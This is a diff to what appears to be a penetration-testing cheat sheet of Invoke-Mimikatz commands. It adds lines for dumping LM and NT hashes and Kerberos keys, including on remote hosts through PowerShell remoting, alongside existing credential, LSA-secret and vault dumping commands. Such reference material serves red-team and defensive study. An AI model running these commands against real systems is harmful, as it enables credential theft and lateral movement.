@@ -168,6 +168,7 @@ Invoke-Mimikatz -command '"sekurlsa::ekeys"'
 Invoke-Mimikatz -Command lsadump::lsa /patch  //local accounts
 
 Invoke-Mimikatz -Command sekurlsa::wdigest
+Invoke-Mimikatz -Command sekurlsa::msv //LM &#x26; NT Hashes
 Invoke-Mimikatz -Command sekurlsa::credman sekurlsa::credman
 <strong>Invoke-Mimikatz -Command sekurlsa::logonPasswords full
 </strong>
@@ -178,8 +179,9 @@ Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 
 Invoke-Mimikatz -DumpCreds   //default parameter
 <strong>
-</strong><strong>Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
-</strong><strong>
+</strong>❗ Invoke-Mimikatz -command '"sekurlsa::ekeys"' -Computername host1  
+Invoke-Mimikatz -command '"sekurlsa::ekeys"' -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
+<strong>
 </strong><strong>When .exe run first:
 </strong>privilege::debug
 token::elevate
